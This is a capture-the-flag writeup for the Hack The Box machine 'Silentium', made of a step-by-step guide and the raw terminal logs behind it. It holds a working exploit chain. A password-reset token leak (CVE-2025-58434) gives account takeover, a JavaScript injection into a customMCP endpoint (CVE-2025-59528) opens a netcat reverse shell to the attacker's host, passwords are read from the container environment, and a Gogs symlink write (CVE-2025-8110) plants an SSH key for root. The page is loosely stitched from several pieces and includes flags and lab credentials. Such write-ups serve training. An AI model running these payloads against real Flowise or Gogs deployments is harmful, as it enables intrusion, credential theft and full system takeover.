@@ -1,0 +1,494 @@
+Silentium — Complete Step-by-Step Writeup
+Target: 10.129.245.103 | OS: Ubuntu 24.04 | Difficulty: Easy
+
+Phase 1: Recon
+# Nmap
+nmap -sC -sV -p- 10.129.245.103
+# → 22/tcp (OpenSSH 9.6p1), 80/tcp (nginx 1.24.0)
+
+# Main site is a static decoy. Enumerate vhosts:
+ffuf -c -u "http://10.129.245.103" -H "Host: FUZZ.silentium.htb" -w ~/wordlists/virtual-hosts.txt -fc 404
+# → staging.silentium.htb
+
+# Add to /etc/hosts
+echo '10.129.245.103 silentium.htb staging.silentium.htb' | sudo tee -a /etc/hosts
+
+# Confirm version
+curl http://staging.silentium.htb/api/v1/version
+# → {"version":"3.0.5"}
+
+Phase 2: Initial Access (CVE-2025-58434)
+# Step 1: Leak tempToken
+curl -s -X POST http://staging.silentium.htb/api/v1/account/forgot-password \
+  -H "Content-Type: application/json" \
+  -d '{"user":{"email":"ben@silentium.htb"}}'
+# → tempToken: "uRSbW2JStTs9sg6iTgZAp4PT2GNJ0g6kVzZO4xcz2wLlMYUhzvSmpGevCboAXw5v"
+
+# Step 2: Reset password (nested user object!)
+curl -s -X POST http://staging.silentium.htb/api/v1/account/reset-password \
+  -H "Content-Type: application/json" \
+  -d '{
+    "user": {
+      "email": "ben@silentium.htb",
+      "tempToken": "uRSbW2JStTs9sg6iTgZAp4PT2GNJ0g6kVzZO4xcz2wLlMYUhzvSmpGevCboAXw5v",
+      "password": "Pwn3d2025!"
+    }
+  }'
+
+# Step 3: Login
+curl -c /tmp/flowise_cookies.txt -X POST \
+  http://staging.silentium.htb/api/v1/auth/login \
+  -H "Content-Type: application/json" \
+  -d '{"email":"ben@silentium.htb","password":"Pwn3d2025!"}'
+
+# Step 4: Get API key (requires x-request-from header)
+curl -s -b /tmp/flowise_cookies.txt \
+  -H "x-request-from: internal" \
+  http://staging.silentium.htb/api/v1/apikey
+# → apiKey: "hWp_8jB76zi0VtKSr2d9TfGK1fm6NuNPg1uA-8FsUJc"
+
+
+Silentium CVE-2025-58434 mitigation guide
+
+View all
+Phase 3: RCE (CVE-2025-59528)
+# Start listener
+nc -lvnp 4444
+
+# Exploit customMCP endpoint (Function() = eval)
+curl -s http://staging.silentium.htb/api/v1/node-load-method/customMCP \
+  -X POST \
+  -H "Content-Type: application/json" \
+  -H "Authorization: Bearer hWp_8jB76zi0VtKSr2d9TfGK1fm6NuNPg1uA-8FsUJc" \
+  -d '{
+    "loadMethod": "listActions",
+    "inputs": {
+      "mcpServerConfig": "({x:(function(){const cp = process.mainModule.require(\"child_process\");cp.execSync(\"rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc 10.10.14.5 4444 >/tmp/f\");return 1;})()})"
+    }
+  }'
+# → root shell inside Docker container
+
+
+Silentium CVE-2025-59528 mitigation guide
+
+View all
+Phase 4: User Flag
+# Inside container:
+cat /proc/1/environ | tr '\0' '\n' | grep -i pass
+# → SMTP_PASSWORD=r04D!!_R4ge
+
+# Exit container, SSH to host:
+ssh ben@10.129.245.103
+# password: r04D!!_R4ge
+
+cat user.txt
+# → eba70ee4205039b323a8aae2e25219b5
+
+Phase 5: Root (CVE-2025-8110 — Gogs Symlink)
+# 1. Port forward
+ssh -fN -o ServerAliveInterval=60 -L 13001:127.0.0.1:3001 ben@10.129.245.103
+# password: r04D!!_R4ge
+
+# 2. Open http://localhost:13001 in browser
+#    → Register account (solve CAPTCHA with EasyOCR if needed)
+#    → Create repo "exploit"
+#    → Settings → Applications → Generate New Token (scope: all)
+#    → Copy token
+
+# 3. Clone and push symlink
+git clone http://rhat6697:<TOKEN>@localhost:13001/rhat6697/exploit.git
+cd exploit
+ln -s /root/.ssh/authorized_keys payload
+git add payload
+git commit -m "add symlink"
+git push
+
+# 4. Get file SHA
+SHA=$(curl -s "http://localhost:13001/api/v1/repos/rhat6697/exploit/contents/payload" \
+  -H "Authorization: token <TOKEN>" | python3 -c "import sys,json;print(json.load(sys.stdin)['sha'])")
+
+# 5. Write public key through symlink (base64-encoded!)
+PUBKEY_B64=$(base64 -w0 ~/.ssh/id_ed25519.pub)
+
+curl -X PUT \
+  "http://localhost:13001/api/v1/repos/rhat6697/exploit/contents/payload" \
+  -H "Authorization: token <TOKEN>" \
+  -H "Content-Type: application/json" \
+  -d "{\"content\": \"$PUBKEY_B64\", \"message\": \"update\", \"sha\": \"$SHA\"}"
+
+# 6. SSH as root
+ssh root@10.129.245.103
+cat /root/root.txt
+# → 9543c92d09071388fad7a294278d68d2
+
+Pitfalls to Remember
+Mistake	Fix
+Flat JSON in reset-password	Use nested "user": {...} object
+Cookie: <session_cookies> (literal)	Use Authorization: Bearer <API_KEY>
+exec() (async, dies)	Use execSync() (blocking)
+Gogs API content field	Must be base64-encoded
+staging-v2-code.dev.silentium.htb:3001 in git URL	Use localhost:13001 (your tunnel)
+Tunnel drops	Add -o ServerAliveInterval=60
+
+
+Copy
+
+
+machine summaty
+
+
+Summarized Silentium HTB machine details
+Silentium — Machine Summary
+Name	Silentium
+OS	Ubuntu 24.04 (kernel 6.8.0-107-generic)
+Difficulty	Easy
+XP	450
+Released	11 April 2026
+Creator	7u9y
+Status	Retired (official writeup available)
+User Flag	eba70ee4205039b323a8aae2e25219b5
+Root Flag	9543c92d09071388fad7a294278d68d2
+──(white㉿white)-[~/white/Documents/htb]
+└─$ rustscan -a 10.129.245.103 -r 1-1000
+
+.----. .-. .-. .----..---.  .----. .---.   .--.  .-. .-.
+| {}  }| { } |{ {__ {_   _}{ {__  /  ___} / {} \ |  `| |
+| .-. \| {_} |.-._} } | |  .-._} }\     }/  /\  \| |\  |
+`-' `-'`-----'`----'  `-'  `----'  `---' `-'  `-'`-' `-'
+The Modern Day Port Scanner.
+________________________________________
+: http://discord.skerritt.blog         :
+: https://github.com/RustScan/RustScan :
+ --------------------------------------
+RustScan: Where scanning meets swagging. 😎
+
+[~] The config file is expected to be at "/home/white/.rustscan.toml"
+[!] File limit is lower than default batch size. Consider upping with --ulimit. May cause harm to sensitive servers
+[!] Your file limit is very small, which negatively impacts RustScan's speed. Use the Docker image, or up the Ulimit with '--ulimit 5000'. 
+Open 10.129.245.103:22
+Open 10.129.245.103:80
+[~] Starting Script(s)
+[~] Starting Nmap 7.99 ( https://nmap.org ) at 2026-09-26 11:07 +0530
+Initiating Ping Scan at 11:07
+Scanning 10.129.245.103 [4 ports]
+Completed Ping Scan at 11:07, 0.58s elapsed (1 total hosts)
+Initiating SYN Stealth Scan at 11:07
+Scanning silentium.htb (10.129.245.103) [2 ports]
+Discovered open port 22/tcp on 10.129.245.103
+Discovered open port 80/tcp on 10.129.245.103
+Completed SYN Stealth Scan at 11:07, 0.34s elapsed (2 total ports)
+Nmap scan report for silentium.htb (10.129.245.103)
+Host is up, received echo-reply ttl 63 (0.50s latency).
+Scanned at 2026-09-26 11:07:24 IST for 1s
+
+PORT   STATE SERVICE REASON
+22/tcp open  ssh     syn-ack ttl 63
+80/tcp open  http    syn-ack ttl 63
+
+Read data files from: /usr/share/nmap
+Nmap done: 1 IP address (1 host up) scanned in 1.05 seconds
+           Raw packets sent: 6 (240B) | Rcvd: 3 (116B)
+
+                                                                                                                                                                       
+┌──(white㉿white)-[~/white/Documents/htb
+┌──(white㉿white)-[~/white/Documents/htb]
+└─$ gobuster vhost -u http://10.129.245.103 -w /usr/share/wordlists/dirb/common.txt --append-domain
+
+===============================================================
+Gobuster v3.8.2
+by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
+===============================================================
+[+] Url:                       http://10.129.245.103
+[+] Method:                    GET
+[+] Threads:                   10
+[+] Wordlist:                  /usr/share/wordlists/dirb/common.txt
+[+] User Agent:                gobuster/3.8.2
+[+] Timeout:                   10s
+[+] Append Domain:             true
+[+] Exclude Hostname Length:   false
+===============================================================
+Starting gobuster in VHOST enumeration mode
+===============================================================
+.git/HEAD.10.129.245.103 Status: 400 [Size: 166]
+.svn/entries.10.129.245.103 Status: 400 [Size: 166]
+@.10.129.245.103 Status: 400 [Size: 166]
+_vti_bin/_vti_adm/admin.dll.10.129.245.103 Status: 400 [Size: 166]
+_vti_bin/_vti_aut/author.dll.10.129.245.103 Status: 400 [Size: 166]
+_vti_bin/shtml.dll.10.129.245.103 Status: 400 [Size: 166]
+cgi-bin/.10.129.245.103 Status: 400 [Size: 166]
+CVS/Entries.10.129.245.103 Status: 400 [Size: 166]
+CVS/Repository.10.129.245.103 Status: 400 [Size: 166]
+CVS/Root.10.129.245.103 Status: 400 [Size: 166]
+Documents and Settings.10.129.245.103 Status: 400 [Size: 166]
+Program Files.10.129.245.103 Status: 400 [Size: 166]
+reports list.10.129.245.103 Status: 400 [Size: 166]
+Progress: 4613 / 4613 (100.00%)
+===============================================================
+Finished
+==============================
+──(white㉿white)-[~/white/Documents/htb]
+└─$ echo '10.129.245.103 silentium.htb staging.silentium.htb' | sudo tee -a /etc/hosts
+curl http://staging.silentium.htb/api/v1/version
+                            
+[sudo] password for white: 
+10.129.245.103 silentium.htb staging.silentium.htb
+{"version":"3.0.5"}                                                                                                                                                                       
+┌──(white㉿white)-[~/white/Documents/htb]
+└─$ curl -s -X POST http://staging.silentium.htb/api/v1/account/forgot-password \
+  -H "Content-Type: application/json" \
+  -d '{"user":{"email":"ben@silentium.htb"}}'
+{"user":{"id":"e26c9d6c-678c-4c10-9e36-01813e8fea73","name":"admin","email":"ben@silentium.htb","credential":"$2a$05$6o1ngPjXiRj.EbTK33PhyuzNBn2CLo8.b0lyys3Uht9Bfuos2pWhG","tempToken":"uRSbW2JStTs9sg6iTgZAp4PT2GNJ0g6kVzZO4xcz2wLlMYUhzvSmpGevCboAXw5v","tokenExpiry":"2026-09-26T04:34:39.290Z","status":"active","createdDate":"2026-01-29T20:14:57.000Z","updatedDate":"2026-09-26T04:19:39.000Z","createdBy":"e26c9d6c-678c-4c10-9e36-01813e8fea73","updatedBy":"e26c9d6c-678c-4c10-9e36-01813e8fea73"},"organization":{},"organizationUser":{},"workspace":{},"workspaceUser":{},"role":{}}                                                                                                                                                                       
+┌──(white㉿white)-[~/white/Documents/htb]
+└─$ curl -s -X POST http://staging.silentium.htb/api/v1/account/reset-password \
+  -H "Content-Type: application/json" \
+  -d '{
+    "user": {
+      "email": "ben@silentium.htb",
+      "tempToken": "uRSbW2JStTs9sg6iTgZAp4PT2GNJ0g6kVzZO4xcz2wLlMYUhzvSmpGevCboAXw5v",
+      "password": "Pwn3d2025!"
+    }
+  }'
+
+{"user":{"id":"e26c9d6c-678c-4c10-9e36-01813e8fea73","name":"admin","email":"ben@silentium.htb","credential":"$2a$05$DGKXzDZCE6SwyYQgaakRhe8MB92L84dFvwkfr1c.qyhex44vr9Sq2","tempToken":"","tokenExpiry":null,"status":"active","createdDate":"2026-01-29T20:14:57.000Z","updatedDate":"2026-09-26T04:23:02.000Z","createdBy":"e26c9d6c-678c-4c10-9e36-01813e8fea73","updatedBy":"e26c9d6c-678c-4c10-9e36-01813e8fea73"},"organization":{},"organizationUser":{},"workspace":{},"workspaceUser":{},"role":{}}                                                                                                                                                                       
+┌──(white㉿white)-[~/white/Documents/htb]
+└─$ 
+                                                                                                                                                                       
+┌──(white㉿white)-[~/white/Documents/htb]
+└─$ curl -c /tmp/flowise_cookies.txt -X POST \
+  http://staging.silentium.htb/api/v1/auth/login \
+  -H "Content-Type: application/json" \
+  -d '{"email":"ben@silentium.htb","password":"Pwn3d2025!"}'
+{"id":"e26c9d6c-678c-4c10-9e36-01813e8fea73","email":"ben@silentium.htb","name":"admin","roleId":"0d9b0a16-df95-198c-8e71-f517d74b70ef","activeOrganizationId":"4b8da5da-66a2-4a4d-9c6c-7657c28c2d11","activeOrganizationSubscriptionId":null,"activeOrganizationCustomerId":null,"activeOrganizationProductId":"","isOrganizationAdmin":true,"activeWorkspaceId":"c54b3e15-690b-4d76-bcca-6ee241f57f46","activeWorkspace":"Default Workspace","assignedWorkspaces":[{"id":"c54b3e15-690b-4d76-bcca-6ee241f57f46","name":"Default Workspace","role":"owner","organizationId":"4b8da5da-66a2-4a4d-9c6c-7657c28c2d11"}],"isApiKeyValidated":true,"permissions":["organization","workspace"],"features":{},"isSSO":false}                                                                                                                                                                       
+┌──(white㉿white)-[~/white/Documents/htb]
+└─$ curl -s -b /tmp/flowise_cookies.txt \
+  -H "x-request-from: internal" \
+  http://staging.silentium.htb/api/v1/apikey
+
+[{"id":"dbb137c0-631d-4e5d-8ece
+
+
+
+-f73896813d2f","apiKey":"hW
+
+p_8jB76zi0VtKSr2d9TfGK1fm6NuNPg1uA-8Fs
+UJc","apiSecret"
+
+:"19dda1ff9ccdb6ce56886141e0a15bdd191685fb8894661c03be9a8bbc0c1e22d7aa99c2f349d616a69449b41bea3b87e1127117e20441b4dadd06a6065674e4.a440d02c8a3f40d8","keyName":"DefaultKey","updatedDate":"2026-03-16T22:51:46.000Z","workspaceId":"c54b3e15-690b-4d76-bcca-6ee241f57f46","chatFlows":[]}]                                                                                                                         ┌──(white㉿white)-[~/white/Documents/htb]
+└─$ curl -s -b /tmp/flowise_cookies.txt \                                   
+  -H "x-request-from: internal" \
+  http://staging.silentium.htb/api/v1/apikey
+  
+[{"id":"dbb137c0-631d-4e5d-8ece-f73896813d2f","apiKey":"hWp_8jB76zi0VtKSr2d9TfGK1fm6NuNPg1uA-8FsUJc","apiSecret":"19dda1ff9ccdb6ce56886141e0a15bdd191685fb8894661c03be9a8bbc0c1e22d7aa99c2f349d616a69449b41bea3b87e1127117e20441b4dadd06a6065674e4.a440d02c8a3f40d8","keyName":"DefaultKey","updatedDate":"2026-03-16T22:51:46.000Z","workspaceId":"c54b3e15-690b-4d76-bcca-6ee241f57f46","chatFlows":[]}]                                                                                                                                                                       
+┌──(white㉿white)-[~/white/Documents/htb]
+└─$ curl -s http://staging.silentium.htb/api/v1/node-load-method/customMCP \
+  -X POST \                      
+  -H "Content-Type: application/json" \     
+  -H "Authorization: Bearer hWp_8jB76zi0VtKSr2d9TfGK1fm6NuNPg1uA-8FsUJc" \
+  -d '{
+    "loadMethod": "listActions",
+    "inputs": {
+      "mcpServerConfig": "({x:(function(){const cp = process.mainModule.require(\"child_process\");cp.execSync(\"rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc 10.10.15.70 4444 >/tmp/f\");return 1;})()})" 
+    }    
+  }'
+<html>
+<head><title>504 Gateway Time-out</title></head>
+<body>
+<center><h1>504 Gateway Time-out</h1></center>
+<hr><center>nginx/1.24.0 (Ubuntu)</center>
+</body>
+</html>
+                 ──(white㉿white)-[~/white/Documents/htb]
+└─$ nc -lvnp 4444   
+listening on [any] 4444 ...
+connect to [10.10.15.70] from (UNKNOWN) [10.129.245.103] 46007
+sh: can't access tty; job control turned off
+/ # ls
+bin
+dev
+etc
+home
+lib
+media
+mnt
+opt
+proc
+root
+run
+sbin
+srv
+sys
+tmp
+usr
+var
+/ # cd /home     
+/home # ls
+node
+/home # cd node
+/home/node # ld
+ld: no input files
+/home/node # cat /proc/1/environ | tr '\0' '\n' | grep -i pass   
+FLOWISE_PASSWORD=F1l3_d0ck3r
+SMTP_PASSWORD=r04D!!_R4ge
+/home/node # exit
+                                                                                                                                                                       
+┌──(white㉿white)-[~/white/Documents/htb]
+└─$ ssh ben@10.129.245.103
+The authenticity of host '10.129.245.103 (10.129.245.103)' can't be established.
+ED25519 key fingerprint is: SHA256:OZNUeTZ9jastNKKQ1tFXatbeOZzSFg5Dt7nhwhjorR0
+This host key is known by the following other names/addresses:
+    ~/.ssh/known_hosts:3: [hashed name]
+    ~/.ssh/known_hosts:46: [hashed name]
+    ~/.ssh/known_hosts:62: [hashed name]
+    ~/.ssh/known_hosts:70: [hashed name]
+    ~/.ssh/known_hosts:71: [hashed name]
+    ~/.ssh/known_hosts:72: [hashed name]
+    ~/.ssh/known_hosts:119: [hashed name]
+    ~/.ssh/known_hosts:120: [hashed name]
+Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
+Warning: Permanently added '10.129.245.103' (ED25519) to the list of known hosts.
+ben@10.129.245.103's password: 
+Welcome to Ubuntu 24.04.4 LTS (GNU/Linux 6.8.0-107-generic x86_64)
+
+ * Documentation:  https://help.ubuntu.com
+ * Management:     https://landscape.canonical.com
+ * Support:        https://ubuntu.com/pro
+
+ System information as of Sat Sep 26 04:30:07 AM UTC 2026
+
+  System load:           0.0
+  Usage of /:            82.9% of 13.37GB
+  Memory usage:          18%
+  Swap usage:            0%
+  Processes:             225
+  Users logged in:       0
+  IPv4 address for eth0: 10.129.245.103
+  IPv6 address for eth0: dead:beef::a0de:adff:fe4b:8a32
+
+ * Strictly confined Kubernetes makes edge and IoT secure. Learn how MicroK8s
+   just raised the bar for easy, resilient and secure K8s cluster deployment.
+
+   https://ubuntu.com/engage/secure-kubernetes-at-the-edge
+
+Expanded Security Maintenance for Applications is not enabled.
+
+68 updates can be applied immediately.
+52 of these updates are standard security updates.
+To see these additional updates run: apt list --upgradable
+
+1 additional security update can be applied with ESM Apps.
+Learn more about enabling ESM Apps service at https://ubuntu.com/esm
+
+
+The list of available updates is more than a week old.
+To check for new updates run: sudo apt update
+Last login: Wed Apr  8 19:12:55 2026 from 10.10.14.5
+ben@silentium:~$ ls
+user.txt
+ben@silentium:~$ cat user.txt 
+eba70ee4205039b323a8aae2e25219b5
+ben@silentium:~$       
+
+git clone http://rhat6697:c1678b863d00e4499e8ba355f1fed054f00198e1@localhost:13001/rhat6697/exploit.git
+cd exploit
+
+ln -s /root/.ssh/authorized_keys payload
+git add payload
+git commit -m "add symlink"
+git push
+Cloning into 'exploit'...
+warning: You appear to have cloned an empty repository.
+hint: Using 'master' as the name for the initial branch. This default branch name
+hint: will change to "main" in Git 3.0. To configure the initial branch name
+hint: to use in all of your new repositories, which will suppress this warning,
+hint: call:
+hint:
+hint:   git config --global init.defaultBranch <name>
+hint:
+hint: Names commonly chosen instead of 'master' are 'main', 'trunk' and
+hint: 'development'. The just-created branch can be renamed via this command:
+hint:
+hint:   git branch -m <name>
+hint:
+hint: Disable this message with "git config set advice.defaultBranchName false"
+[master (root-commit) 08e92ba] add symlink
+ 1 file changed, 1 insertion(+)
+ create mode 120000 payload
+Enumerating objects: 3, done.
+Counting objects: 100% (3/3), done.
+Writing objects: 100% (3/3), 241 bytes | 241.00 KiB/s, done.
+Total 3 (delta 0), reused 0 (delta 0), pack-reused 0 (from 0)
+To http://localhost:13001/rhat6697/exploit.git
+ * [new branch]      master -> master
+                                                                                                                                                                       
+┌──(white㉿white)-[~/white/Documents/htb/exploit]
+└─$ SHA=$(curl -s "http://localhost:13001/api/v1/repos/rhat6697/exploit/contents/payload" \
+  -H "Authorization: token c1678b863d00e4499e8ba355f1fed054f00198e1" | python3 -c "import sys,json;print(json.load(sys.stdin)['sha'])")
+
+PUBKEY=$(cat ~/.ssh/id_ed25519.pub)
+
+curl -X PUT \
+  "http://localhost:13001/api/v1/repos/rhat6697/exploit/contents/payload" \
+  -H "Authorization: token c1678b863d00e4499e8ba355f1fed054f00198e1" \
+  -H "Content-Type: application/json" \
+  -d "{\"content\": \"$PUBKEY\", \"message\": \"update\", \"sha\": \"$SHA\"}"
+{"message":"Something went wrong, please check the server logs for more information.","url":"https://github.com/gogs/docs-api"}                                                                                                                                                                       
+┌──(white㉿white)-[~/white/Documents/htb/exploit]
+└─$     # Check SHA is not empty
+echo $SHA
+
+# If empty, re-fetch it
+SHA=$(curl -s "http://localhost:13001/api/v1/repos/rhat6697/exploit/contents/payload" \
+  -H "Authorization: token c1678b863d00e4499e8ba355f1fed054f00198e1" | python3 -c "import sys,json;print(json.load(sys.stdin)['sha'])")
+
+# Base64-encode your public key
+PUBKEY_B64=$(base64 -w0 ~/.ssh/id_ed25519.pub)
+
+curl -X PUT \
+  "http://localhost:13001/api/v1/repos/rhat6697/exploit/contents/payload" \
+  -H "Authorization: token c1678b863d00e4499e8ba355f1fed054f00198e1" \
+  -H "Content-Type: application/json" \
+  -d "{\"content\": \"$PUBKEY_B64\", \"message\": \"update\", \"sha\": \"$SHA\"}"
+9c87fc525b63ebd989fa409533d3be1b295d6ec3
+{"commit":{"url":"http://staging-v2-code.dev.silentium.htb:3001/api/v1/repos/rhat6697/exploit/contents/payload","sha":"08e92babe89b20f8d04951871771ad2eeb7deca5","html_url":"http://staging-v2-code.dev.silentium.htb:3001/rhat6697/exploit/commits/08e92babe89b20f8d04951871771ad2eeb7deca5","commit":{"url":"http://staging-v2-code.dev.silentium.htb:3001/api/v1/repos/rhat6697/exploit/contents/payload","author":{"name":"Your Name","email":"your.email@example.com","date":"2026-09-26T04:55:49Z"},"committer":{"name":"Your Name","email":"your.email@example.com","date":"2026-09-26T04:55:49Z"},"message":"add symlink","tree":{"url":"http://staging-v2-code.dev.silentium.htb:3001/api/v1/repos/rhat6697/exploit/tree/08e92babe89b20f8d04951871771ad2eeb7deca5","sha":"08e92babe89b20f8d04951871771ad2eeb7deca5"}},"author":null,"committer":null,"parents":[]},"content":{"type":"symlink","target":"/root/.ssh/authorized_keys","size":26,"name":"payload","path":"payload","sha":"9c87fc525b63ebd989fa409533d3be1b295d6ec3","url":"http://staging-v2-code.dev.silentium.htb:3001/api/v1/repos/rhat6697/exploit/contents/payload","git_url":"","html_url":"http://staging-v2-code.dev.silentium.htb:3001/rhat6697/exploit/src/master/payload","download_url":"http://staging-v2-code.dev.silentium.htb:3001/rhat6697/exploit/raw/master/payload","_links":{"git":"","self":"http://staging-v2-code.dev.silentium.htb:3001/api/v1/repos/rhat6697/exploit/contents/payload","html":"http://staging-v2-code.dev.silentium.htb:3001/rhat6697/exploit/src/master/payload"}}}                                                                                                                                                                       
+┌──(white㉿white)-[~/white/Documents/htb/exploit]
+└─$ ssh root@10.129.245.103
+cat /root/root.txt
+Welcome to Ubuntu 24.04.4 LTS (GNU/Linux 6.8.0-107-generic x86_64)
+
+ * Documentation:  https://help.ubuntu.com
+ * Management:     https://landscape.canonical.com
+ * Support:        https://ubuntu.com/pro
+
+ System information as of Sat Sep 26 04:58:37 AM UTC 2026
+
+  System load:           0.01
+  Usage of /:            82.9% of 13.37GB
+  Memory usage:          19%
+  Swap usage:            0%
+  Processes:             233
+  Users logged in:       1
+  IPv4 address for eth0: 10.129.245.103
+  IPv6 address for eth0: dead:beef::a0de:adff:fe4b:8a32
+
+ * Strictly confined Kubernetes makes edge and IoT secure. Learn how MicroK8s
+   just raised the bar for easy, resilient and secure K8s cluster deployment.
+
+   https://ubuntu.com/engage/secure-kubernetes-at-the-edge
+
+Expanded Security Maintenance for Applications is not enabled.
+
+68 updates can be applied immediately.
+52 of these updates are standard security updates.
+To see these additional updates run: apt list --upgradable
+
+1 additional security update can be applied with ESM Apps.
+Learn more about enabling ESM Apps service at https://ubuntu.com/esm
+
+
+The list of available updates is more than a week old.
+To check for new updates run: sudo apt update
+Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings
+
+root@silentium:~# cat /root/root.txt
+9543c92d09071388fad7a294278d68d2
+root@silentium:~# 
